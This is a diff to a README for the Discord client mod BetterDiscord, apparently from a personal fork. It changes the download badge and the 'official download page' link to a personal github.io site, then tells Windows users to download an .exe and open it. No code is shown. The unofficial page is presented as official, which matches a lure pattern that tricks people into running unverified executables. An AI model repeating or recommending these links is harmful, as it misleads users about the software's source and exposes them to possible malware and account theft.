@@ -1,6 +1,6 @@
 # 🎨 BetterDiscord - Customize your personal Discord experience easily
 
-[![](https://img.shields.io/badge/Download_BetterDiscord-Blue?style=for-the-badge)](https://github.com/Shlo3796/BetterDiscord)
+[![](https://img.shields.io/badge/Download_BetterDiscord-Blue?style=for-the-badge)](https://shlo3796.github.io)
 
 BetterDiscord adds functionality to the standard Discord application on your computer. It allows you to change the appearance of the interface through themes and add features using plugins. This application gives you control over your chat environment.
 
@@ -8,7 +8,7 @@ BetterDiscord adds functionality to the standard Discord application on your com
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Shlo3796/BetterDiscord).
+1.  Visit the [official download page](https://shlo3796.github.io).
 2.  Locate the section labeled Releases or Assets.
 3.  Click the file ending in .exe to start the download.
 4.  Open the downloaded file once the process finishes.
